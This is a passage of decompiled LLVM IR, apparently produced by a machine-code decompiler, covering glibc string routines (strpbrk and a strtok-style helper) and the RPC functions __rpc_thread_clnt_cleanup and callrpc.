  %v0_805509d = load i32, i32* @esi, align 4
  %v0_805509e = load i32, i32* @ebx, align 4
  store i32 %v0_805509e, i32* %stack_var_-12, align 4
  %v4_805509f = ptrtoint i8* %arg1 to i32
  store i32 %v4_805509f, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_80550ab = icmp eq i8* %arg1, null
  %v1_80550ad = icmp eq i1 %v1_80550ab, false
  br i1 %v1_80550ad, label %dec_label_pc_80550b1, label %dec_label_pc_80550af

dec_label_pc_80550af:                             ; preds = %entry
  %v1_80550af = inttoptr i32 %arg3 to i32*
  %v2_80550af = load i32, i32* %v1_80550af, align 4
  store i32 %v2_80550af, i32* @ebx, align 4
  br label %dec_label_pc_80550b1

dec_label_pc_80550b1:                             ; preds = %entry, %dec_label_pc_80550af
  %v0_80550b4 = phi i32 [ %v4_805509f, %entry ], [ %v2_80550af, %dec_label_pc_80550af ]
  %v0_80550b1 = load i32, i32* @ecx, align 4
  %v5_80550b4 = inttoptr i32 %v0_80550b4 to i8*
  %v8_80550b5 = call i32 @__GI_strspn(i8* %v5_80550b4, i32 %arg2, i32 %v0_80550b1, i32 %v0_80550b1)
  store i32 %v8_80550b5, i32* %eax.global-to-local, align 4
  %v0_80550bd = load i32, i32* @ebx, align 4
  %v2_80550bd = add i32 %v0_80550bd, %v8_80550b5
  store i32 %v2_80550bd, i32* @ebx, align 4
  %v1_80550bf = inttoptr i32 %v2_80550bd to i8*
  %v2_80550bf = load i8, i8* %v1_80550bf, align 1
  %v3_80550bf = icmp eq i8 %v2_80550bf, 0
  %v1_80550c2 = icmp eq i1 %v3_80550bf, false
  br i1 %v1_80550c2, label %dec_label_pc_80550ca, label %dec_label_pc_80550c4

dec_label_pc_80550c4:                             ; preds = %dec_label_pc_80550b1
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_80550c6 = load i32, i32* @esi, align 4
  %v2_80550c6 = inttoptr i32 %v1_80550c6 to i32*
  store i32 %v2_80550bd, i32* %v2_80550c6, align 4
  %v0_80550f4.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80550f1

dec_label_pc_80550ca:                             ; preds = %dec_label_pc_80550b1
  %v0_80550ca = load i32, i32* @edx, align 4
  %v0_80550cc = load i32, i32* @edi, align 4
  %v8_80550ce = call i32 @__GI_strpbrk(i8* %v1_80550bf, i32 %v0_80550cc, i32 %v0_80550ca, i32 %v0_80550ca)
  store i32 %v8_80550ce, i32* %eax.global-to-local, align 4
  %v2_80550d6 = icmp eq i32 %v8_80550ce, 0
  %v1_80550d8 = icmp eq i1 %v2_80550d6, false
  br i1 %v1_80550d8, label %dec_label_pc_80550e9, label %dec_label_pc_80550da

dec_label_pc_80550da:                             ; preds = %dec_label_pc_80550ca
  %v0_80550de = load i32, i32* @ebx, align 4
  %v5_80550de = inttoptr i32 %v0_80550de to i8*
  %v8_80550df = call i32 @rawmemchr(i8* %v5_80550de, i32 0, i32 %v8_80550ce, i32 %v8_80550ce)
  br label %dec_label_pc_80550ed

dec_label_pc_80550e9:                             ; preds = %dec_label_pc_80550ca
  %v9_80550ce = inttoptr i32 %v8_80550ce to i8*
  store i8 0, i8* %v9_80550ce, align 1
  %v2_80550ec = add i32 %v8_80550ce, 1
  br label %dec_label_pc_80550ed

dec_label_pc_80550ed:                             ; preds = %dec_label_pc_80550da, %dec_label_pc_80550e9
  %storemerge = phi i32 [ %v2_80550ec, %dec_label_pc_80550e9 ], [ %v8_80550df, %dec_label_pc_80550da ]
  %v0_80550ed = phi i32 [ %v2_80550ec, %dec_label_pc_80550e9 ], [ %v8_80550df, %dec_label_pc_80550da ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_80550ed = load i32, i32* @esi, align 4
  %v2_80550ed = inttoptr i32 %v1_80550ed to i32*
  store i32 %v0_80550ed, i32* %v2_80550ed, align 4
  %v0_80550ef = load i32, i32* @ebx, align 4
  store i32 %v0_80550ef, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80550f1

dec_label_pc_80550f1:                             ; preds = %dec_label_pc_80550c4, %dec_label_pc_80550ed
  %v0_80550f4 = phi i32 [ %v0_80550f4.pre, %dec_label_pc_80550c4 ], [ %v0_80550ef, %dec_label_pc_80550ed ]
  %v2_80550f1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80550f1, i32* @ebx, align 4
  store i32 %v0_805509d, i32* @esi, align 4
  store i32 %v0_805509c, i32* @edi, align 4
  ret i32 %v0_80550f4

; uselistorder directives
  uselistorder i32 %v8_80550ce, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80550f1, { 1, 0 }
  uselistorder label %dec_label_pc_80550ed, { 1, 0 }
  uselistorder label %dec_label_pc_80550b1, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_80550f9 = load i32, i32* @ebx, align 4
  %v2_805511024 = load i8, i8* %arg1, align 1
  %v4_805511228 = icmp eq i8 %v2_805511024, 0
  br i1 %v4_805511228, label %dec_label_pc_805511a, label %dec_label_pc_8055116.lr.ph

dec_label_pc_8055116.lr.ph:                       ; preds = %entry
  %v3_805511025 = zext i8 %v2_805511024 to i32
  %v5_805511026 = and i32 %v0_80550f9, -256
  %v6_805511027 = or i32 %v3_805511025, %v5_805511026
  %v4_80550fe = ptrtoint i8* %arg1 to i32
  %v1_805510913 = inttoptr i32 %arg2 to i8*
  %v4_8055109.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8055116

dec_label_pc_8055104:                             ; preds = %dec_label_pc_8055116, %dec_label_pc_8055108
  %v6_805510922 = phi i32 [ %v6_8055109, %dec_label_pc_8055108 ], [ %v6_805510917, %dec_label_pc_8055116 ]
  %v2_805510921 = phi i8 [ %v2_8055109, %dec_label_pc_8055108 ], [ %v2_805510914, %dec_label_pc_8055116 ]
  %v0_805510820 = phi i32 [ %v1_8055108, %dec_label_pc_8055108 ], [ %arg2, %dec_label_pc_8055116 ]
  %v15_8055104 = icmp eq i8 %v2_805510921, %v2_805511031
  br i1 %v15_8055104, label %dec_label_pc_805511c, label %dec_label_pc_8055108

dec_label_pc_8055108:                             ; preds = %dec_label_pc_8055104
  %v1_8055108 = add i32 %v0_805510820, 1
  %v1_8055109 = inttoptr i32 %v1_8055108 to i8*
  %v2_8055109 = load i8, i8* %v1_8055109, align 1
  %v3_8055109 = zext i8 %v2_8055109 to i32
  %v5_8055109 = and i32 %v6_805510922, -256
  %v6_8055109 = or i32 %v3_8055109, %v5_8055109
  %v4_805510b = icmp eq i8 %v2_8055109, 0
  %v1_805510d = icmp eq i1 %v4_805510b, false
  br i1 %v1_805510d, label %dec_label_pc_8055104, label %dec_label_pc_805510f

dec_label_pc_805510f:                             ; preds = %dec_label_pc_8055108, %dec_label_pc_8055116
  %v4_8055109.pre34 = phi i32 [ %v6_805510917, %dec_label_pc_8055116 ], [ %v6_8055109, %dec_label_pc_8055108 ]
  %v1_805510f = add i32 %v0_805510f29, 1
  %v1_8055110 = inttoptr i32 %v1_805510f to i8*
  %v2_8055110 = load i8, i8* %v1_8055110, align 1
  %v3_8055110 = zext i8 %v2_8055110 to i32
  %v5_8055110 = and i32 %v6_805511032, -256
  %v6_8055110 = or i32 %v3_8055110, %v5_8055110
  %v4_8055112 = icmp eq i8 %v2_8055110, 0
  br i1 %v4_8055112, label %dec_label_pc_805511a, label %dec_label_pc_8055116

dec_label_pc_8055116:                             ; preds = %dec_label_pc_8055116.lr.ph, %dec_label_pc_805510f
  %v4_8055109.pre = phi i32 [ %v4_8055109.pre.pre, %dec_label_pc_8055116.lr.ph ], [ %v4_8055109.pre34, %dec_label_pc_805510f ]
  %v6_805511032 = phi i32 [ %v6_805511027, %dec_label_pc_8055116.lr.ph ], [ %v6_8055110, %dec_label_pc_805510f ]
  %v2_805511031 = phi i8 [ %v2_805511024, %dec_label_pc_8055116.lr.ph ], [ %v2_8055110, %dec_label_pc_805510f ]
  %v0_805510f29 = phi i32 [ %v4_80550fe, %dec_label_pc_8055116.lr.ph ], [ %v1_805510f, %dec_label_pc_805510f ]
  %v2_805510914 = load i8, i8* %v1_805510913, align 1
  %v3_805510915 = zext i8 %v2_805510914 to i32
  %v5_805510916 = and i32 %v4_8055109.pre, -256
  %v6_805510917 = or i32 %v3_805510915, %v5_805510916
  %v4_805510b18 = icmp eq i8 %v2_805510914, 0
  %v1_805510d19 = icmp eq i1 %v4_805510b18, false
  br i1 %v1_805510d19, label %dec_label_pc_8055104, label %dec_label_pc_805510f

dec_label_pc_805511a:                             ; preds = %dec_label_pc_805510f, %entry
  br label %dec_label_pc_805511c

dec_label_pc_805511c:                             ; preds = %dec_label_pc_8055104, %dec_label_pc_805511a
  %v0_805511e = phi i32 [ 0, %dec_label_pc_805511a ], [ %v0_805510f29, %dec_label_pc_8055104 ]
  store i32 %v0_80550f9, i32* @ebx, align 4
  ret i32 %v0_805511e

; uselistorder directives
  uselistorder i8 %v2_805510914, { 1, 2, 0 }
  uselistorder i32 %v1_805510f, { 1, 0 }
  uselistorder i32 %v6_8055109, { 1, 0 }
  uselistorder i8 %v2_8055109, { 1, 2, 0 }
  uselistorder i32 %v1_8055108, { 1, 0 }
  uselistorder i8 %v2_805511024, { 0, 2, 1 }
  uselistorder i32 %v0_80550f9, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805511c, { 1, 0 }
  uselistorder label %dec_label_pc_8055116, { 1, 0 }
  uselistorder label %dec_label_pc_805510f, { 1, 0 }
}

define i32 @__rpc_thread_clnt_cleanup() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055120 = load i32, i32* @ebx, align 4
  store i32 %v0_8055120, i32* %stack_var_-4, align 4
  %v1_8055124 = call i32 @__rpc_thread_variables(i32 %v0_8055120)
  %v1_8055129 = add i32 %v1_8055124, 164
  %v2_8055129 = inttoptr i32 %v1_8055129 to i32*
  %v3_8055129 = load i32, i32* %v2_8055129, align 4
  store i32 %v3_8055129, i32* @ebx, align 4
  %v1_805512f = icmp eq i32 %v3_8055129, 0
  br i1 %v1_805512f, label %dec_label_pc_8055152, label %dec_label_pc_8055133

dec_label_pc_8055133:                             ; preds = %entry
  %v1_8055133 = inttoptr i32 %v3_8055129 to i32*
  %v2_8055133 = load i32, i32* %v1_8055133, align 4
  %v1_8055135 = icmp eq i32 %v2_8055133, 0
  br i1 %v1_8055135, label %dec_label_pc_8055146, label %dec_label_pc_8055139

dec_label_pc_8055139:                             ; preds = %dec_label_pc_8055133
  %v1_805513c = add i32 %v2_8055133, 4
  %v2_805513c = inttoptr i32 %v1_805513c to i32*
  %v3_805513c = load i32, i32* %v2_805513c, align 4
  %v5_8055140 = add i32 %v3_805513c, 16
  %v6_8055140 = inttoptr i32 %v5_8055140 to i32*
  %v7_8055140 = load i32, i32* %v6_8055140, align 4
  call void @__pseudo_call(i32 %v7_8055140)
  br label %dec_label_pc_8055146

dec_label_pc_8055146:                             ; preds = %dec_label_pc_8055133, %dec_label_pc_8055139
  %v1_805514a = call i32 @free(i32 %v3_8055129)
  br label %dec_label_pc_8055152

dec_label_pc_8055152:                             ; preds = %entry, %dec_label_pc_8055146
  %v2_8055152 = load i32, i32* %stack_var_-12, align 4
  %v2_8055154 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055154, i32* @ebx, align 4
  ret i32 %v2_8055152

; uselistorder directives
  uselistorder label %dec_label_pc_8055152, { 1, 0 }
  uselistorder label %dec_label_pc_8055146, { 1, 0 }
}

define i32 @callrpc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-1120 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %v1_805517b = call i32 @__rpc_thread_variables(i32 0)
  store i32 %v1_805517b, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %v1_805517b, i32* @ebx, align 4
  %v1_8055185 = add i32 %v1_805517b, 164
  %v2_8055185 = inttoptr i32 %v1_8055185 to i32*
  %v3_8055185 = load i32, i32* %v2_8055185, align 4
  store i32 %v3_8055185, i32* @esi, align 4
  %v1_805518b = icmp eq i32 %v3_8055185, 0
  %v1_805518d = icmp eq i1 %v1_805518b, false
  br i1 %v1_805518d, label %dec_label_pc_80551af, label %dec_label_pc_805518f

dec_label_pc_805518f:                             ; preds = %entry
  %v5_8055195 = call i32 @calloc(i64 1, i32 24, i32 %v1_805517b, i32 %v1_805517b)
  store i32 %v5_8055195, i32* @esi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_80551a1 = icmp eq i32 %v5_8055195, 0
  br i1 %v1_80551a1, label %dec_label_pc_8055360, label %dec_label_pc_80551a9

dec_label_pc_80551a9:                             ; preds = %dec_label_pc_805518f
  %v1_80551a9 = load i32, i32* @ebx, align 4
  %v2_80551a9 = add i32 %v1_80551a9, 164
  %v3_80551a9 = inttoptr i32 %v2_80551a9 to i32*
  store i32 %v5_8055195, i32* %v3_80551a9, align 4
  %v0_80551af.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80551af

dec_label_pc_80551af:                             ; preds = %entry, %dec_label_pc_80551a9
  %v0_80551af = phi i32 [ %v3_8055185, %entry ], [ %v0_80551af.pre, %dec_label_pc_80551a9 ]
  %v1_80551af = add i32 %v0_80551af, 20
  %v2_80551af = inttoptr i32 %v1_80551af to i32*
  %v3_80551af = load i32, i32* %v2_80551af, align 4
  %v4_80551af = icmp eq i32 %v3_80551af, 0
  %v1_80551b3 = icmp eq i1 %v4_80551af, false
  br i1 %v1_80551b3, label %dec_label_pc_80551d2, label %dec_label_pc_80551b5

dec_label_pc_80551b5:                             ; preds = %dec_label_pc_80551af
  %v1_80551bd = call i32 @malloc(i32 256)
  %v2_80551bd = inttoptr i32 %v1_80551bd to i8*
  store i32 %v1_80551bd, i32* %eax.global-to-local, align 4
  %v2_80551c5 = load i32, i32* @esi, align 4
  %v3_80551c5 = add i32 %v2_80551c5, 20
  %v4_80551c5 = inttoptr i32 %v3_80551c5 to i32*
  store i32 %v1_80551bd, i32* %v4_80551c5, align 4
  store i8 0, i8* %v2_80551bd, align 1
  %v0_80551cb = load i32, i32* @esi, align 4
  %v1_80551cb = add i32 %v0_80551cb, 4
  %v2_80551cb = inttoptr i32 %v1_80551cb to i32*
  store i32 -1, i32* %v2_80551cb, align 4
  %v0_80551d2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80551d2

dec_label_pc_80551d2:                             ; preds = %dec_label_pc_80551af, %dec_label_pc_80551b5
  %v0_80551ea = phi i32 [ %v0_80551af, %dec_label_pc_80551af ], [ %v0_80551d2.pre, %dec_label_pc_80551b5 ]
  %v1_80551d2 = add i32 %v0_80551ea, 16
  %v2_80551d2 = inttoptr i32 %v1_80551d2 to i32*
  %v3_80551d2 = load i32, i32* %v2_80551d2, align 4
  %v4_80551d2 = icmp eq i32 %v3_80551d2, 0
  br i1 %v4_80551d2, label %dec_label_pc_80551fd, label %dec_label_pc_80551d8

dec_label_pc_80551d8:                             ; preds = %dec_label_pc_80551d2
  %v1_80551d8 = add i32 %v0_80551ea, 8
  %v2_80551d8 = inttoptr i32 %v1_80551d8 to i32*
  %v3_80551d8 = load i32, i32* %v2_80551d8, align 4
  %v4_80551d8 = load i32, i32* @edi, align 4
  %v15_80551d8 = icmp eq i32 %v3_80551d8, %v4_80551d8
  %v1_80551db = icmp eq i1 %v15_80551d8, false
  br i1 %v1_80551db, label %dec_label_pc_80551fd, label %dec_label_pc_80551dd

dec_label_pc_80551dd:                             ; preds = %dec_label_pc_80551d8
  store i32 %arg3, i32* @eax, align 4
  %v1_80551e0 = add i32 %v0_80551ea, 12
  %v2_80551e0 = inttoptr i32 %v1_80551e0 to i32*
  %v3_80551e0 = load i32, i32* %v2_80551e0, align 4
  %v15_80551e0 = icmp eq i32 %v3_80551e0, %arg3
  %v1_80551e3 = icmp eq i1 %v15_80551e0, false
  br i1 %v1_80551e3, label %dec_label_pc_80551fd, label %dec_label_pc_80551e5

dec_label_pc_80551e5:                             ; preds = %dec_label_pc_80551dd
  %v1_80551ea = add i32 %v0_80551ea, 20
  %v2_80551ea = inttoptr i32 %v1_80551ea to i32*
  %v3_80551ea = load i32, i32* %v2_80551ea, align 4
  %v4_80551ed = inttoptr i32 %v3_80551ea to i8*
  %v5_80551ed = call i32 @__GI_strcoll(i8* %v4_80551ed, i32 %arg1, i32 %arg3, i32 %arg3)
  store i32 %v5_80551ed, i32* %eax.global-to-local, align 4
  %v1_80551f5 = icmp eq i32 %v5_80551ed, 0
  br i1 %v1_80551f5, label %dec_label_pc_8055320, label %dec_label_pc_80551e5.dec_label_pc_80551fd_crit_edge

dec_label_pc_80551e5.dec_label_pc_80551fd_crit_edge: ; preds = %dec_label_pc_80551e5
  %v0_80551fd.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80551fd

dec_label_pc_80551fd:                             ; preds = %dec_label_pc_80551e5.dec_label_pc_80551fd_crit_edge, %dec_label_pc_80551dd, %dec_label_pc_80551d8, %dec_label_pc_80551d2
  %v0_80551fd = phi i32 [ %v0_80551fd.pre, %dec_label_pc_80551e5.dec_label_pc_80551fd_crit_edge ], [ %v0_80551ea, %dec_label_pc_80551dd ], [ %v0_80551ea, %dec_label_pc_80551d8 ], [ %v0_80551ea, %dec_label_pc_80551d2 ]
  %v1_80551fd = add i32 %v0_80551fd, 4
  %v2_80551fd = inttoptr i32 %v1_80551fd to i32*
  %v3_80551fd = load i32, i32* %v2_80551fd, align 4
  store i32 %v3_80551fd, i32* %eax.global-to-local, align 4
  %v1_8055200 = add i32 %v0_80551fd, 16
  %v2_8055200 = inttoptr i32 %v1_8055200 to i32*
  store i32 0, i32* %v2_8055200, align 4
  %v0_8055207 = load i32, i32* %eax.global-to-local, align 4
  %v10_8055207 = icmp eq i32 %v0_8055207, -1
  br i1 %v10_8055207, label %dec_label_pc_805521f, label %dec_label_pc_805520c

dec_label_pc_805520c:                             ; preds = %dec_label_pc_80551fd
  %v1_8055210 = call i32 @__libc_close(i32 %v0_8055207)
  store i32 %v1_8055210, i32* %eax.global-to-local, align 4
  %v0_8055215 = load i32, i32* @esi, align 4
  %v1_8055215 = add i32 %v0_8055215, 4
  %v2_8055215 = inttoptr i32 %v1_8055215 to i32*
  store i32 -1, i32* %v2_8055215, align 4
  br label %dec_label_pc_805521f

dec_label_pc_805521f:                             ; preds = %dec_label_pc_80551fd, %dec_label_pc_805520c
  %v0_805521f = load i32, i32* @esi, align 4
  %v1_805521f = inttoptr i32 %v0_805521f to i32*
  %v2_805521f = load i32, i32* %v1_805521f, align 4
  %v1_8055221 = icmp eq i32 %v2_805521f, 0
  br i1 %v1_8055221, label %dec_label_pc_8055238, label %dec_label_pc_8055225

dec_label_pc_8055225:                             ; preds = %dec_label_pc_805521f
  %v1_8055228 = add i32 %v2_805521f, 4
  %v2_8055228 = inttoptr i32 %v1_8055228 to i32*
  %v3_8055228 = load i32, i32* %v2_8055228, align 4
  store i32 %v3_8055228, i32* %eax.global-to-local, align 4
  store i32 134566447, i32* %stack_var_-112, align 4
  %v5_805522c = add i32 %v3_8055228, 16
  %v6_805522c = inttoptr i32 %v5_805522c to i32*
  %v7_805522c = load i32, i32* %v6_805522c, align 4
  call void @__pseudo_call(i32 %v7_805522c)
  %v0_805522f = load i32, i32* @esi, align 4
  %v1_805522f = inttoptr i32 %v0_805522f to i32*
  store i32 0, i32* %v1_805522f, align 4
  br label %dec_label_pc_8055238

dec_label_pc_8055238:                             ; preds = %dec_label_pc_805521f, %dec_label_pc_8055225
  store i32 1024, i32* @ebx, align 4
  %v8_8055247 = ptrtoint i32* %stack_var_-1120 to i32
  %v2_8055277 = ptrtoint i32* %stack_var_-28 to i32
  %v2_805527b = ptrtoint i32* %stack_var_-24 to i32
  %v2_805527f = ptrtoint i32* %stack_var_-64 to i32
  %v0_8055275.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055275

dec_label_pc_805524c:                             ; preds = %dec_label_pc_8055294, %dec_label_pc_8055275
  %v3_805524c = load i32, i32* %stack_var_-28, align 4
  %v13_805524c = icmp eq i32 %v3_805524c, -1
  %v1_8055250 = icmp eq i1 %v13_805524c, false
  br i1 %v1_8055250, label %dec_label_pc_805535b, label %dec_label_pc_8055256

dec_label_pc_8055256:                             ; preds = %dec_label_pc_805524c
  %v0_8055256 = load i32, i32* %stack_var_-112, align 4
  %v1_8055256 = call i32 @__errno_location(i32 %v0_8055256)
  store i32 %v1_8055256, i32* %eax.global-to-local, align 4
  %v1_805525b = inttoptr i32 %v1_8055256 to i32*
  %v2_805525b = load i32, i32* %v1_805525b, align 4
  %v11_805525b = icmp eq i32 %v2_805525b, 34
  %v1_805525e = icmp eq i1 %v11_805525b, false
  br i1 %v1_805525e, label %dec_label_pc_805535b, label %dec_label_pc_8055264

dec_label_pc_8055264:                             ; preds = %dec_label_pc_8055256
  %v0_8055264 = load i32, i32* @ebx, align 4
  %v2_8055264 = mul i32 %v0_8055264, 2
  store i32 %v2_8055264, i32* @ebx, align 4
  %v1_8055266 = add i32 %v2_8055264, 30
  %v1_8055269 = and i32 %v1_8055266, -16
  store i32 %v1_8055269, i32* %eax.global-to-local, align 4
  %v0_805526c = load i32, i32* @esp, align 4
  %v2_805526c = sub i32 %v0_805526c, %v1_8055269
  %v1_805526e = add i32 %v2_805526c, 15
  %v1_8055272 = and i32 %v1_805526e, -16
  br label %dec_label_pc_8055275

dec_label_pc_8055275:                             ; preds = %dec_label_pc_8055238, %dec_label_pc_8055264
  %v0_8055282 = phi i32 [ 1024, %dec_label_pc_8055238 ], [ %v2_8055264, %dec_label_pc_8055264 ]
  %v0_8055275 = phi i32 [ %v0_8055275.pre, %dec_label_pc_8055238 ], [ %v1_8055269, %dec_label_pc_8055264 ]
  %storemerge = phi i32 [ %v8_8055247, %dec_label_pc_8055238 ], [ %v1_8055272, %dec_label_pc_8055264 ]
  store i32 %v2_805527f, i32* %eax.global-to-local, align 4
  %v9_8055288 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull %stack_var_-64, i32 %storemerge, i32 %v0_8055282, i32 %v2_805527b, i32 %v2_8055277, i32 %v0_8055275, i32 %v0_8055275)
  store i32 %v9_8055288, i32* %eax.global-to-local, align 4
  %v1_8055290 = icmp eq i32 %v9_8055288, 0
  %v1_8055292 = icmp eq i1 %v1_8055290, false
  br i1 %v1_8055292, label %dec_label_pc_805524c, label %dec_label_pc_8055294

dec_label_pc_8055294:                             ; preds = %dec_label_pc_8055275
  %v3_8055294 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_8055294, i32* %eax.global-to-local, align 4
  %v1_8055297 = icmp eq i32 %v3_8055294, 0
  br i1 %v1_8055297, label %dec_label_pc_805524c, label %dec_label_pc_805529b

dec_label_pc_805529b:                             ; preds = %dec_label_pc_8055294
  %v1_80552ad = add i32 %v3_8055294, 12
  %v2_80552ad = inttoptr i32 %v1_80552ad to i32*
  %v3_80552ad = load i32, i32* %v2_80552ad, align 4
  %v1_80552b0 = add i32 %v3_8055294, 16
  %v2_80552b0 = inttoptr i32 %v1_80552b0 to i32*
  %v3_80552b0 = load i32, i32* %v2_80552b0, align 4
  store i32 %v3_80552b0, i32* %eax.global-to-local, align 4
  %v2_80552b3 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80552b3, i32* @ebx, align 4
  %v1_80552b6 = inttoptr i32 %v3_80552b0 to i32*
  %v2_80552b6 = load i32, i32* %v1_80552b6, align 4
  %v3_80552b9 = bitcast i32* %stack_var_-40 to i16*
  %v4_80552b9 = call i32 @memcpy(i16* %v3_80552b9, i32 %v2_80552b6, i32 %v3_80552ad)
  %v0_80552bf = load i32, i32* @esi, align 4
  %v1_80552bf = add i32 %v0_80552bf, 4
  store i32 %v1_80552bf, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_80552d9 = load i32, i32* @edi, align 4
  %v6_80552db = call i32 @__GI_clntudp_create(i32 %v2_80552b3, i32 %v0_80552d9, i32 %arg3, i32 5, i32 0, i32 %v1_80552bf)
  store i32 %v6_80552db, i32* %eax.global-to-local, align 4
  %v1_80552e3 = load i32, i32* @esi, align 4
  %v2_80552e3 = inttoptr i32 %v1_80552e3 to i32*
  store i32 %v6_80552db, i32* %v2_80552e3, align 4
  %v1_80552e5 = icmp eq i32 %v6_80552db, 0
  %v1_80552e7 = icmp eq i1 %v1_80552e5, false
  br i1 %v1_80552e7, label %dec_label_pc_80552f2, label %dec_label_pc_80552e9

dec_label_pc_80552e9:                             ; preds = %dec_label_pc_805529b
  %v0_80552e9 = call i32 @__GI___rpc_thread_createerr()
  store i32 %v0_80552e9, i32* %eax.global-to-local, align 4
  %v1_80552ee = inttoptr i32 %v0_80552e9 to i32*
  %v2_80552ee = load i32, i32* %v1_80552ee, align 4
  store i32 %v2_80552ee, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055360

dec_label_pc_80552f2:                             ; preds = %dec_label_pc_805529b
  %v0_80552f2 = load i32, i32* @esi, align 4
  %v1_80552f2 = add i32 %v0_80552f2, 16
  %v2_80552f2 = inttoptr i32 %v1_80552f2 to i32*
  store i32 1, i32* %v2_80552f2, align 4
  %v0_80552f9 = load i32, i32* @edi, align 4
  %v1_80552f9 = load i32, i32* @esi, align 4
  %v2_80552f9 = add i32 %v1_80552f9, 8
  %v3_80552f9 = inttoptr i32 %v2_80552f9 to i32*
  store i32 %v0_80552f9, i32* %v3_80552f9, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v1_80552ff = load i32, i32* @esi, align 4
  %v2_80552ff = add i32 %v1_80552ff, 12
  %v3_80552ff = inttoptr i32 %v2_80552ff to i32*
  store i32 %arg3, i32* %v3_80552ff, align 4
  %v0_805530b = load i32, i32* @esi, align 4
  %v1_805530b = add i32 %v0_805530b, 20
  %v2_805530b = inttoptr i32 %v1_805530b to i32*
  %v3_805530b = load i32, i32* %v2_805530b, align 4
  %v3_805530e = inttoptr i32 %v3_805530b to i8*
  %v4_805530e = call i32 @strncpy(i8* %v3_805530e, i32 %arg1, i32 255)
  store i32 %v4_805530e, i32* %eax.global-to-local, align 4
  %v0_8055313 = load i32, i32* @esi, align 4
  %v1_8055313 = add i32 %v0_8055313, 20
  %v2_8055313 = inttoptr i32 %v1_8055313 to i32*
  %v3_8055313 = load i32, i32* %v2_8055313, align 4
  store i32 %v3_8055313, i32* %eax.global-to-local, align 4
  %v1_8055319 = add i32 %v3_8055313, 255
  %v2_8055319 = inttoptr i32 %v1_8055319 to i8*
  store i8 0, i8* %v2_8055319, align 1
  br label %dec_label_pc_8055320

dec_label_pc_8055320:                             ; preds = %dec_label_pc_80551e5, %dec_label_pc_80552f2
  %v0_805532e = load i32, i32* @esi, align 4
  %v1_805532e = inttoptr i32 %v0_805532e to i32*
  %v2_805532e = load i32, i32* %v1_805532e, align 4
  store i32 %v2_805532e, i32* %eax.global-to-local, align 4
  %v1_8055330 = add i32 %v2_805532e, 4
  %v2_8055330 = inttoptr i32 %v1_8055330 to i32*
  %v3_8055330 = load i32, i32* %v2_8055330, align 4
  store i32 %arg6, i32* %stack_var_-112, align 4
  %v5_8055349 = inttoptr i32 %v3_8055330 to i32*
  %v6_8055349 = load i32, i32* %v5_8055349, align 4
  call void @__pseudo_call(i32 %v6_8055349)
  %v0_805534e = load i32, i32* %eax.global-to-local, align 4
  %v1_805534e = icmp eq i32 %v0_805534e, 0
  br i1 %v1_805534e, label %dec_label_pc_8055360, label %dec_label_pc_8055352

dec_label_pc_8055352:                             ; preds = %dec_label_pc_8055320
  %v0_8055352 = load i32, i32* @esi, align 4
  %v1_8055352 = add i32 %v0_8055352, 16
  %v2_8055352 = inttoptr i32 %v1_8055352 to i32*
  store i32 0, i32* %v2_8055352, align 4
  %v0_8055367.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055360

dec_label_pc_805535b:                             ; preds = %dec_label_pc_8055256, %dec_label_pc_805524c
  store i32 13, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055360

dec_label_pc_8055360:                             ; preds = %dec_label_pc_8055320, %dec_label_pc_805518f, %dec_label_pc_8055352, %dec_label_pc_80552e9, %dec_label_pc_805535b
  %v0_8055367 = phi i32 [ 0, %dec_label_pc_8055320 ], [ 0, %dec_label_pc_805518f ], [ %v0_8055367.pre, %dec_label_pc_8055352 ], [ %v2_80552ee, %dec_label_pc_80552e9 ], [ 13, %dec_label_pc_805535b ]
  ret i32 %v0_8055367

; uselistorder directives
  uselistorder i32 %v2_8055264, { 2, 1, 0 }
  uselistorder i32 %v0_8055207, { 1, 0 }
  uselistorder i32 %v0_80551fd, { 1, 0 }
  uselistorder i32 %v1_80551bd, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 19, 17, 18, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 30, { 2, 1, 0 }
